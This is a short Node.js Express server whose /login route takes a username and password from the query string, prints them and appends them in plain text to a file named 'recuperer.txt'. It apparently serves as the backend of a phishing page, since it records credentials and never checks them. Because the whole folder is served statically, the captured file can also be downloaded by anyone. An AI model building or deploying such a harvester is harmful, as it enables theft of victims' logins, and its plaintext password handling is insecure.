const express = require('express')
const app = express()
const port = 3000
var path = require('path');
var fs = require('fs');

app.use(express.static('.'));

app.get('/', function (req, res) {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/login', function (req, res) {
    let username = req.query.username;
    let password = req.query.password;
    console.log(username, password)

    fs.readFile('recuperer.txt', 'utf8', (err, data) => {
        data += username + ' : ' + password + '\n';
        fs.writeFile('recuperer.txt', data, (err) => {
            if (err) throw err;
            console.log('The file has been saved!');
            res.send('ok')
        });
    })
});

app.listen(port, () => {
    console.log(`Example app listening at http://localhost:${port}`)
  })